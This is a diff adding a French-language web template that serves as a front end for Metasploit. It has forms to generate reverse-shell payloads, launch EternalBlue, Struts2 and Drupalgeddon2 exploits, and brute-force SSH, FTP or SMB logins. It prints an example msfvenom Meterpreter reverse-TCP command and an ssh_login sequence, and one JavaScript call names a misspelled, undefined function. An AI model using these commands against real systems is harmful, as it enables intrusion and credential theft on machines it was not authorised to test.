@@ -1,0 +1,934 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Metasploit Framework - Cybersecurity Toolbox</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.1.3/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f8f9fa;
+        }
+
+        .scan-form {
+            background-color: white;
+            padding: 30px;
+            border-radius: 15px;
+            margin-bottom: 30px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .exploit-type-card {
+            transition: all 0.3s;
+            cursor: pointer;
+            border: 2px solid #e9ecef;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 15px;
+            background: white;
+        }
+
+        .exploit-type-card:hover {
+            border-color: #dc3545;
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(220, 53, 69, 0.2);
+        }
+
+        .exploit-type-card.selected {
+            border-color: #dc3545;
+            background-color: #fff5f5;
+        }
+
+        .form-control {
+            border-radius: 8px;
+            border: 2px solid #e9ecef;
+            padding: 12px 15px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+        }
+
+        .form-control:focus {
+            border-color: #dc3545;
+            box-shadow: 0 0 0 0.2rem rgba(220, 53, 69, 0.15);
+        }
+
+        .btn {
+            border-radius: 8px;
+            padding: 12px 25px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+        }
+
+        .info-card {
+            background: white;
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
+        }
+
+        .navbar {
+            background-color: #343a40 !important;
+            margin-bottom: 0;
+        }
+
+        .navbar-brand {
+            font-weight: bold;
+        }
+
+        .navbar-nav .nav-link {
+            color: rgba(255, 255, 255, 0.8) !important;
+        }
+
+        .navbar-nav .nav-link:hover {
+            color: white !important;
+        }
+
+        .navbar-nav .nav-link.active {
+            color: white !important;
+            font-weight: bold;
+        }
+
+        .header-section {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .header-icon {
+            font-size: 4rem;
+            color: #dc3545;
+            margin-bottom: 20px;
+        }
+
+        .badge-example {
+            background-color: #e9ecef;
+            color: #495057;
+            padding: 4px 8px;
+            border-radius: 12px;
+            font-size: 0.8rem;
+            margin: 2px;
+            display: inline-block;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .badge-example:hover {
+            background-color: #dc3545;
+            color: white;
+        }
+
+        .command-example {
+            background: #f8f9fa;
+            border-left: 4px solid #dc3545;
+            padding: 10px 15px;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+            border-radius: 0 8px 8px 0;
+            font-size: 0.9rem;
+        }
+
+        .exploit-description {
+            color: #6c757d;
+            font-size: 0.9rem;
+            margin-top: 5px;
+        }
+
+        .alert {
+            border-radius: 10px;
+        }
+
+        .nav-tabs .nav-link {
+            border-radius: 10px 10px 0 0;
+            border: none;
+            background: #f8f9fa;
+            color: #6c757d;
+            margin-right: 5px;
+        }
+
+        .nav-tabs .nav-link.active {
+            background: white;
+            color: #dc3545;
+            border-bottom: 3px solid #dc3545;
+        }
+
+        .tab-content {
+            background: white;
+            border-radius: 0 10px 10px 10px;
+            padding: 20px;
+        }
+
+        /* Console Styles */
+        .console-container {
+            background: white;
+            border-radius: 15px;
+            padding: 20px;
+            margin-top: 30px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+            display: none;
+        }
+
+        .console-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #e9ecef;
+        }
+
+        .console-terminal {
+            background: #1e1e1e;
+            color: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            height: 400px;
+            overflow-y: auto;
+            border: 2px solid #333;
+            position: relative;
+        }
+
+        .console-line {
+            margin-bottom: 5px;
+            opacity: 0;
+            animation: fadeIn 0.5s ease forwards;
+        }
+
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+
+        .console-prompt {
+            color: #00ff00;
+        }
+
+        .console-output {
+            color: #ffffff;
+        }
+
+        .console-error {
+            color: #ff4444;
+        }
+
+        .console-success {
+            color: #00ff00;
+        }
+
+        .console-warning {
+            color: #ffaa00;
+        }
+
+        .progress-bar-container {
+            margin: 15px 0;
+            display: none;
+        }
+
+        .status-indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+
+        .status-idle { background-color: #6c757d; }
+        .status-running { 
+            background-color: #ffc107; 
+            animation: pulse 1.5s infinite;
+        }
+        .status-completed { background-color: #28a745; }
+        .status-error { background-color: #dc3545; }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .console-actions {
+            margin-top: 15px;
+            display: flex;
+            gap: 10px;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+            }
+            
+            .scan-form {
+                padding: 20px;
+            }
+
+            .console-terminal {
+                height: 300px;
+                font-size: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar navbar-expand-lg navbar-dark">
+        <div class="container-fluid">
+            <a class="navbar-brand" href="{{ url_for('index') }}">
+                <i class="fas fa-shield-alt"></i> Cybersecurity Toolbox
+            </a>
+            <div class="navbar-nav ms-auto">
+                <a class="nav-link" href="{{ url_for('index') }}">Accueil</a>
+                <a class="nav-link" href="{{ url_for('network_security') }}">Scan Sécurité</a>
+                <a class="nav-link active" href="{{ url_for('metasploit_page') }}">Metasploit</a>
+                <a class="nav-link" href="{{ url_for('all_results') }}">Résultats</a>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container mt-4">
+        <!-- En-tête -->
+        <div class="header-section">
+            <div class="header-icon">
+                <i class="fas fa-rocket"></i>
+            </div>
+            <h1 class="h2 text-dark mb-3">Metasploit Framework</h1>
+            <p class="lead text-muted">
+                Framework de test d'intrusion et d'exploitation de vulnérabilités
+            </p>
+            <div class="mt-3">
+                <span class="badge-example" onclick="fillExample('eternal_blue')">EternalBlue</span>
+                <span class="badge-example" onclick="fillExample('apache_struts')">Apache Struts</span>
+                <span class="badge-example" onclick="fillExample('drupalgeddon')">Drupalgeddon</span>
+                <span class="badge-example" onclick="fillExample('handler')">Multi Handler</span>
+            </div>
+        </div>
+
+        <!-- Navigation par onglets -->
+        <ul class="nav nav-tabs" id="metasploitTabs" role="tablist">
+            <li class="nav-item" role="presentation">
+                <button class="nav-link active" id="search-tab" data-bs-toggle="tab" data-bs-target="#search" type="button" role="tab">
+                    <i class="fas fa-search"></i> Recherche d'exploits
+                </button>
+            </li>
+            <li class="nav-item" role="presentation">
+                <button class="nav-link" id="payload-tab" data-bs-toggle="tab" data-bs-target="#payload" type="button" role="tab">
+                    <i class="fas fa-code"></i> Génération de payloads
+                </button>
+            </li>
+            <li class="nav-item" role="presentation">
+                <button class="nav-link" id="exploit-tab" data-bs-toggle="tab" data-bs-target="#exploit" type="button" role="tab">
+                    <i class="fas fa-bug"></i> Exploitation
+                </button>
+            </li>
+            <li class="nav-item" role="presentation">
+                <button class="nav-link" id="scan-tab" data-bs-toggle="tab" data-bs-target="#scan" type="button" role="tab">
+                    <i class="fas fa-radar"></i> Scan de vulnérabilités
+                </button>
+            </li>
+            <li class="nav-item" role="presentation">
+                <button class="nav-link" id="bruteforce-tab" data-bs-toggle="tab" data-bs-target="#bruteforce" type="button" role="tab">
+                    <i class="fas fa-hammer"></i> Force brute
+                </button>
+            </li>
+        </ul>
+
+        <div class="tab-content" id="metasploitTabContent">
+            <!-- Onglet Recherche d'exploits -->
+            <div class="tab-pane fade show active" id="search" role="tabpanel">
+                <div class="row">
+                    <div class="col-md-8">
+                        <form id="searchForm" method="POST" action="/metasploit/search">
+                            <div class="mb-3">
+                                <label for="searchKeyword" class="form-label">
+                                    <i class="fas fa-search text-danger"></i> Mot-clé de recherche
+                                </label>
+                                <input type="text" class="form-control" id="searchKeyword" name="keyword" 
+                                       placeholder="Ex: apache, windows, ssh, drupal..." required>
+                                <div class="command-example mt-2">
+                                    Commande: search apache
+                                </div>
+                            </div>
+                            <div class="mb-3">
+                                <label for="specificExploit" class="form-label">
+                                    <i class="fas fa-info-circle text-danger"></i> Exploit spécifique (optionnel)
+                                </label>
+                                <input type="text" class="form-control" id="specificExploit" name="exploit" 
+                                       placeholder="Ex: exploit/windows/smb/ms17_010_eternalblue">
+                            </div>
+                            <div class="d-flex gap-2">
+                                <button type="submit" class="btn btn-danger">
+                                    <i class="fas fa-search"></i> Rechercher exploits
+                                </button>
+                                <button type="button" class="btn btn-outline-danger" onclick="listPayloads()">
+                                    <i class="fas fa-list"></i> Lister payloads
+                                </button>
+                            </div>
+                        </form>
+                    </div>
+                    <div class="col-md-4">
+                        <div class="info-card">
+                            <h6><i class="fas fa-lightbulb text-warning"></i> Conseils</h6>
+                            <ul class="list-unstyled small text-muted">
+                                <li>• Utilisez des mots-clés spécifiques</li>
+                                <li>• Vérifiez la compatibilité des exploits</li>
+                                <li>• Consultez les prérequis avant utilisation</li>
+                                <li>• Testez en environnement contrôlé</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Onglet Génération de payloads -->
+            <div class="tab-pane fade" id="payload" role="tabpanel">
+                <form id="payloadForm" method="POST" action="/metasploit/payload">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="mb-3">
+                                <label for="payloadType" class="form-label">
+                                    <i class="fas fa-code text-danger"></i> Type de payload
+                                </label>
+                                <select class="form-select" id="payloadType" name="payload_type" required>
+                                    <option value="windows/meterpreter/reverse_tcp">Windows Meterpreter Reverse TCP</option>
+                                    <option value="linux/x86/meterpreter/reverse_tcp">Linux Meterpreter Reverse TCP</option>
+                                    <option value="php/meterpreter/reverse_tcp">PHP Meterpreter Reverse TCP</option>
+                                    <option value="windows/shell/reverse_tcp">Windows Shell Reverse TCP</option>
+                                    <option value="linux/x86/shell/reverse_tcp">Linux Shell Reverse TCP</option>
+                                </select>
+                            </div>
+                            <div class="mb-3">
+                                <label for="lhost" class="form-label">LHOST (IP d'écoute)</label>
+                                <input type="text" class="form-control" id="lhost" name="lhost" 
+                                       placeholder="192.168.1.100" required>
+                            </div>
+                            <div class="mb-3">
+                                <label for="lport" class="form-label">LPORT (Port d'écoute)</label>
+                                <input type="number" class="form-control" id="lport" name="lport" 
+                                       value="4444" min="1" max="65535" required>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="mb-3">
+                                <label for="payloadFormat" class="form-label">Format de sortie</label>
+                                <select class="form-select" id="payloadFormat" name="format">
+                                    <option value="exe">Executable (.exe)</option>
+                                    <option value="elf">ELF Binary (.elf)</option>
+                                    <option value="php">PHP Script (.php)</option>
+                                    <option value="asp">ASP Script (.asp)</option>
+                                    <option value="raw">Raw Shellcode</option>
+                                </select>
+                            </div>
+                            <div class="alert alert-warning">
+                                <i class="fas fa-exclamation-triangle"></i>
+                                <strong>Attention:</strong> Les payloads générés sont destinés uniquement aux tests autorisés.
+                            </div>
+                            <div class="command-example">
+                                msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe
+                            </div>
+                        </div>
+                    </div>
+                    <button type="submit" class="btn btn-danger">
+                        <i class="fas fa-cog"></i> Générer payload
+                    </button>
+                </form>
+            </div>
+
+            <!-- Onglet Exploitation -->
+            <div class="tab-pane fade" id="exploit" role="tabpanel">
+                <form id="exploitForm" method="POST" action="/metasploit/exploit">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="mb-3">
+                                <label for="exploitPath" class="form-label">
+                                    <i class="fas fa-bug text-danger"></i> Exploit à utiliser
+                                </label>
+                                <select class="form-select" id="exploitPath" name="exploit_path" required>
+                                    <option value="exploit/windows/smb/ms17_010_eternalblue">MS17-010 EternalBlue</option>
+                                    <option value="exploit/multi/http/struts2_content_type_ognl">Apache Struts2</option>
+                                    <option value="exploit/unix/webapp/drupal_drupalgeddon2">Drupalgeddon2</option>
+                                    <option value="exploit/multi/handler">Multi Handler</option>
+                                </select>
+                            </div>
+                            <div class="mb-3">
+                                <label for="targetHost" class="form-label">Cible (RHOST)</label>
+                                <input type="text" class="form-control" id="targetHost" name="target_host" 
+                                       placeholder="192.168.1.50" required>
+                            </div>
+                            <div class="mb-3">
+                                <label for="targetPort" class="form-label">Port cible (RPORT)</label>
+                                <input type="number" class="form-control" id="targetPort" name="target_port" 
+                                       value="445" min="1" max="65535" required>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="mb-3">
+                                <label for="exploitPayload" class="form-label">Payload pour l'exploit</label>
+                                <select class="form-select" id="exploitPayload" name="exploit_payload" required>
+                                    <option value="windows/x64/meterpreter/reverse_tcp">Windows x64 Meterpreter</option>
+                                    <option value="linux/x86/meterpreter/reverse_tcp">Linux x86 Meterpreter</option>
+                                    <option value="php/meterpreter/reverse_tcp">PHP Meterpreter</option>
+                                </select>
+                            </div>
+                            <div class="mb-3">
+                                <label for="exploitLhost" class="form-label">LHOST (votre IP)</label>
+                                <input type="text" class="form-control" id="exploitLhost" name="exploit_lhost" 
+                                       placeholder="192.168.1.100" required>
+                            </div>
+                            <div class="mb-3">
+                                <label for="exploitLport" class="form-label">LPORT (votre port)</label>
+                                <input type="number" class="form-control" id="exploitLport" name="exploit_lport" 
+                                       value="4444" min="1" max="65535" required>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="d-flex gap-2">
+                        <button type="submit" class="btn btn-danger">
+                            <i class="fas fa-rocket"></i> Lancer l'exploit
+                        </button>
+                        <button type="button" class="btn btn-outline-danger" onclick="startListener()">
+                            <i class="fas fa-headphones"></i> Démarrer listener
+                        </button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Onglet Scan de vulnérabilités -->
+            <div class="tab-pane fade" id="scan" role="tabpanel">
+                <form id="scanForm" method="POST" action="/metasploit/scan">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="mb-3">
+                                <label for="scanTarget" class="form-label">
+                                    <i class="fas fa-bullseye text-danger"></i> Cible à scanner
+                                </label>
+                                <input type="text" class="form-control" id="scanTarget" name="target" 
+                                       placeholder="192.168.1.50 ou 192.168.1.0/24" required>
+                            </div>
+                            <div class="mb-3">
+                                <label for="scanType" class="form-label">Type de scan</label>
+                                <select class="form-select" id="scanType" name="scan_type" required>
+                                    <option value="basic">Scan de ports basique</option>
+                                    <option value="smb">Scan SMB</option>
+                                    <option value="ssh">Scan SSH</option>
+                                    <option value="http">Scan HTTP</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="info-card">
+                                <h6><i class="fas fa-info-circle text-info"></i> Types de scan</h6>
+                                <ul class="list-unstyled small">
+                                    <li><strong>Basique:</strong> Scan de ports TCP</li>
+                                    <li><strong>SMB:</strong> Détection de versions SMB</li>
+                                    <li><strong>SSH:</strong> Détection de versions SSH</li>
+                                    <li><strong>HTTP:</strong> Détection de serveurs web</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    <button type="submit" class="btn btn-danger">
+                        <i class="fas fa-search"></i> Lancer le scan
+                    </button>
+                </form>
+            </div>
+
+            <!-- Onglet Force brute -->
+            <div class="tab-pane fade" id="bruteforce" role="tabpanel">
+                <form id="bruteforceForm" method="POST" action="/metasploit/bruteforce">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="mb-3">
+                                <label for="bruteTarget" class="form-label">
+                                    <i class="fas fa-bullseye text-danger"></i> Cible
+                                </label>
+                                <input type="text" class="form-control" id="bruteTarget" name="target" 
+                                       placeholder="192.168.1.50" required>
+                            </div>
+                            <div class="mb-3">
+                                <label for="bruteService" class="form-label">Service</label>
+                                <select class="form-select" id="bruteService" name="service" required>
+                                    <option value="ssh">SSH</option>
+                                    <option value="ftp">FTP</option>
+                                    <option value="smb">SMB</option>
+                                </select>
+                            </div>
+                            <div class="mb-3">
+                                <label for="usernameList" class="form-label">Liste d'utilisateurs (optionnel)</label>
+                                <input type="text" class="form-control" id="usernameList" name="username_list" 
+                                       placeholder="/usr/share/wordlists/users.txt">
+                            </div>
+                            <div class="mb-3">
+                                <label for="passwordList" class="form-label">Liste de mots de passe (optionnel)</label>
+                                <input type="text" class="form-control" id="passwordList" name="password_list" 
+                                       placeholder="/usr/share/wordlists/passwords.txt">
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="alert alert-warning">
+                                <i class="fas fa-exclamation-triangle"></i>
+                                <strong>Attention:</strong> Les attaques par force brute doivent être utilisées uniquement sur des systèmes autorisés.
+                            </div>
+                            <div class="command-example">
+                                use auxiliary/scanner/ssh/ssh_login<br>
+                                set RHOSTS 192.168.1.50<br>
+                                run
+                            </div>
+                        </div>
+                    </div>
+                    <button type="submit" class="btn btn-danger">
+                        <i class="fas fa-key"></i> Lancer l'attaque
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <!-- Console de sortie -->
+        <div class="console-container" id="consoleContainer">
+            <div class="console-header">
+                <h5><i class="fas fa-terminal"></i> Console Metasploit</h5>
+                <div>
+                    <span class="status-indicator status-idle" id="statusIndicator"></span>
+                    <span id="statusText">Prêt</span>
+                </div>
+            </div>
+            <div class="console-terminal" id="consoleTerminal">
+                <div class="console-line console-prompt">msf6 > </div>
+            </div>
+            <div class="progress-bar-container" id="progressContainer">
+                <div class="progress">
+                    <div class="progress-bar progress-bar-striped progress-bar-animated bg-danger" 
+                         role="progressbar" style="width: 0%" id="progressBar"></div>
+                </div>
+            </div>
+            <div class="console-actions">
+                <button class="btn btn-sm btn-outline-secondary" onclick="clearConsole()">
+                    <i class="fas fa-trash"></i> Effacer
+                </button>
+                <button class="btn btn-sm btn-outline-secondary" onclick="saveConsole()">
+                    <i class="fas fa-download"></i> Sauvegarder
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.1.3/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // Variables globales
+        let currentOperation = null;
+        let consoleLines = 0;
+
+        // Exemples prédéfinis
+        const examples = {
+            eternal_blue: {
+                exploit: 'exploit/windows/smb/ms17_010_eternalblue',
+                target: '192.168.1.10',
+                port: '445',
+                payload: 'windows/x64/meterpreter/reverse_tcp'
+            },
+            apache_struts: {
+                exploit: 'exploit/multi/http/struts2_content_type_ognl',
+                target: '192.168.1.20',
+                port: '8080',
+                payload: 'linux/x86/meterpreter/reverse_tcp'
+            },
+            drupalgeddon: {
+                exploit: 'exploit/unix/webapp/drupal_drupalgeddon2',
+                target: '192.168.1.30',
+                port: '80',
+                payload: 'php/meterpreter/reverse_tcp'
+            },
+            handler: {
+                exploit: 'exploit/multi/handler',
+                target: '',
+                port: '4444',
+                payload: 'windows/meterpreter/reverse_tcp'
+            }
+        };
+
+        // Remplir avec un exemple
+        function fillExample(type) {
+            const example = examples[type];
+            if (example) {
+                document.getElementById('exploitPath').value = example.exploit;
+                document.getElementById('targetHost').value = example.target;
+                document.getElementById('targetPort').value = example.port;
+                document.getElementById('exploitPayload').value = example.payload;
+                
+                // Changer vers l'onglet exploitation
+                const tab = new bootstrap.Tab(document.getElementById('exploit-tab'));
+                tab.show();
+            }
+        }
+
+        // Gestion des formulaires
+        document.getElementById('searchForm').addEventListener('submit', handleFormSubmit);
+        document.getElementById('payloadForm').addEventListener('submit', handleFormSubmit);
+        document.getElementById('exploitForm').addEventListener('submit', handleFormSubmit);
+        document.getElementById('scanForm').addEventListener('submit', handleFormSubmit);
+        document.getElementById('bruteforceForm').addEventListener('submit', handleFormSubmit);
+
+        function handleFormSubmit(event) {
+            event.preventDefault();
+            const form = event.target;
+            const formData = new FormData(form);
+            
+            showConsole();
+            setStatus('running', 'Opération en cours...');
+            addConsoleeLine('prompt', `Démarrage de l'opération...`);
+            
+            fetch(form.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    addConsoleeLine('success', data.output || 'Opération terminée avec succès');
+                    setStatus('completed', 'Terminé');
+                } else {
+                    addConsoleeLine('error', data.error || 'Erreur lors de l\'opération');
+                    setStatus('error', 'Erreur');
+                }
+            })
+            .catch(error => {
+                addConsoleeLine('error', `Erreur: ${error.message}`);
+                setStatus('error', 'Erreur');
+            });
+        }
+
+        // Fonctions de la console
+        function showConsole() {
+            document.getElementById('consoleContainer').style.display = 'block';
+        }
+
+        function addConsoleeLine(type, text) {
+            const terminal = document.getElementById('consoleTerminal');
+            const line = document.createElement('div');
+            line.className = `console-line console-${type}`;
+            
+            const timestamp = new Date().toLocaleTimeString();
+            if (type === 'prompt') {
+                line.textContent = `[${timestamp}] msf6 > ${text}`;
+            } else {
+                line.textContent = `[${timestamp}] ${text}`;
+            }
+            
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+            consoleLines++;
+        }
+
+        function setStatus(status, text) {
+            const indicator = document.getElementById('statusIndicator');
+            const statusText = document.getElementById('statusText');
+            
+            indicator.className = `status-indicator status-${status}`;
+            statusText.textContent = text;
+        }
+
+        function clearConsole() {
+            const terminal = document.getElementById('consoleTerminal');
+            terminal.innerHTML = '<div class="console-line console-prompt">msf6 > </div>';
+            consoleLines = 0;
+            setStatus('idle', 'Prêt');
+        }
+
+        function saveConsole() {
+            const terminal = document.getElementById('consoleTerminal');
+            const content = terminal.textContent;
+            const blob = new Blob([content], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `metasploit_console_${new Date().toISOString().slice(0, 19).replace(/:/g, '-')}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+
+        // Fonctions spécialisées
+        function listPayloads() {
+            showConsole();
+            setStatus('running', 'Récupération des payloads...');
+            addConsoleeLine('prompt', 'show payloads');
+            
+            // Simulation de la liste des payloads
+            setTimeout(() => {
+                const payloads = [
+                    'windows/meterpreter/reverse_tcp',
+                    'linux/x86/meterpreter/reverse_tcp',
+                    'php/meterpreter/reverse_tcp',
+                    'windows/shell/reverse_tcp',
+                    'linux/x86/shell/reverse_tcp',
+                    'generic/shell_reverse_tcp'
+                ];
+                
+                payloads.forEach(payload => {
+                    addConsoleeLine('output', payload);
+                });
+                
+                addConsoleeLine('success', `${payloads.length} payloads trouvés`);
+                setStatus('completed', 'Terminé');
+            }, 2000);
+        }
+
+        function startListener() {
+            const lhost = document.getElementById('exploitLhost').value;
+            const lport = document.getElementById('exploitLport').value;
+            const payload = document.getElementById('exploitPayload').value;
+            
+            if (!lhost || !lport) {
+                alert('Veuillez spécifier LHOST et LPORT');
+                return;
+            }
+            
+            showConsole();
+            setStatus('running', 'Démarrage du listener...');
+            addConsoleeLine('prompt', 'use exploit/multi/handler');
+            addConsoleeLine('prompt', `set payload ${payload}`);
+            addConsoleeLine('prompt', `set LHOST ${lhost}`);
+            addConsoleLine('prompt', `set LPORT ${lport}`);
+            addConsoleeLine('prompt', 'exploit -j');
+            
+            setTimeout(() => {
+                addConsoleeLine('output', `[*] Exploit running as background job 0.`);
+                addConsoleeLine('output', `[*] Exploit completed, but no session was created.`);
+                addConsoleeLine('output', `[*] Started reverse TCP handler on ${lhost}:${lport}`);
+                addConsoleeLine('success', `[*] Waiting for connections...`);
+                setStatus('running', 'En attente de connexions...');
+            }, 3000);
+        }
+
+        // Auto-complétion et validation
+        document.getElementById('targetHost').addEventListener('input', function(e) {
+            const value = e.target.value;
+            const port = document.getElementById('targetPort');
+            
+            // Suggestions de ports selon le type de cible
+            if (value.includes('80') || value.includes('web')) {
+                port.value = '80';
+            } else if (value.includes('ssh')) {
+                port.value = '22';
+            } else if (value.includes('smb') || value.includes('445')) {
+                port.value = '445';
+            }
+        });
+
+        // Validation des formulaires en temps réel
+        function validateIP(ip) {
+            const ipRegex = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
+            return ipRegex.test(ip) || ip.includes('/') || ip.includes('-');
+        }
+
+        document.querySelectorAll('input[placeholder*="192.168"]').forEach(input => {
+            input.addEventListener('blur', function() {
+                if (this.value && !validateIP(this.value)) {
+                    this.classList.add('is-invalid');
+                    if (!this.nextElementSibling || !this.nextElementSibling.classList.contains('invalid-feedback')) {
+                        const feedback = document.createElement('div');
+                        feedback.className = 'invalid-feedback';
+                        feedback.textContent = 'Format d\'IP invalide';
+                        this.parentNode.appendChild(feedback);
+                    }
+                } else {
+                    this.classList.remove('is-invalid');
+                    const feedback = this.parentNode.querySelector('.invalid-feedback');
+                    if (feedback) feedback.remove();
+                }
+            });
+        });
+
+        // Raccourcis clavier
+        document.addEventListener('keydown', function(e) {
+            // Ctrl+Enter pour lancer l'action courante
+            if (e.ctrlKey && e.key === 'Enter') {
+                const activeTab = document.querySelector('.nav-link.active').id;
+                switch(activeTab) {
+                    case 'search-tab':
+                        document.getElementById('searchForm').dispatchEvent(new Event('submit'));
+                        break;
+                    case 'payload-tab':
+                        document.getElementById('payloadForm').dispatchEvent(new Event('submit'));
+                        break;
+                    case 'exploit-tab':
+                        document.getElementById('exploitForm').dispatchEvent(new Event('submit'));
+                        break;
+                    case 'scan-tab':
+                        document.getElementById('scanForm').dispatchEvent(new Event('submit'));
+                        break;
+                    case 'bruteforce-tab':
+                        document.getElementById('bruteforceForm').dispatchEvent(new Event('submit'));
+                        break;
+                }
+                e.preventDefault();
+            }
+            
+            // Esc pour effacer la console
+            if (e.key === 'Escape') {
+                clearConsole();
+            }
+        });
+
+        // Initialisation
+        document.addEventListener('DOMContentLoaded', function() {
+            // Valeurs par défaut
+            document.getElementById('lhost').value = '192.168.1.100';
+            document.getElementById('exploitLhost').value = '192.168.1.100';
+            
+            // Message de bienvenue
+            addConsoleeLine('output', 'Metasploit Framework Console');
+            addConsoleeLine('output', '==============================================');
+            addConsoleeLine('output', 'Utilisez Ctrl+Enter pour lancer rapidement les actions');
+            addConsoleeLine('output', 'Utilisez Esc pour effacer la console');
+            addConsoleeLine('prompt', 'Prêt pour les opérations...');
+            
+            // Animation des cartes d'exploitation
+            document.querySelectorAll('.exploit-type-card').forEach(card => {
+                card.addEventListener('click', function() {
+                    document.querySelectorAll('.exploit-type-card').forEach(c => c.classList.remove('selected'));
+                    this.classList.add('selected');
+                });
+            });
+        });
+
+        // Fonction pour afficher les détails d'un exploit
+        function showExploitDetails(exploitName) {
+            showConsole();
+            setStatus('running', 'Récupération des informations...');
+            addConsoleeLine('prompt', `info ${exploitName}`);
+            
+            setTimeout(() => {
+                addConsoleeLine('output', `Name: ${exploitName}`);
+                addConsoleeLine('output', 'Module: exploit');
+                addConsoleeLine('output', 'Platform: windows');
+                addConsoleeLine('output', 'Arch: x86, x64');
+                addConsoleeLine('output', 'Privileged: No');
+                addConsoleeLine('output', 'License: Metasploit Framework License (BSD)');
+                addConsoleeLine('output', 'Rank: Average');
+                addConsoleeLine('output', 'Disclosed: 2017-03-14');
+                addConsoleeLine('success', 'Informations récupérées');
+                setStatus('completed', 'Terminé');
+            }, 2000);
+        }
+
+        // Gestion des erreurs réseau
+        window.addEventListener('online', function() {
+            addConsoleeLine('success', 'Connexion réseau rétablie');
+        });
+
+        window.addEventListener('offline', function() {
+            addConsoleeLine('warning', 'Connexion réseau perdue');
+        });
+    </script>
+</body>
+</html>
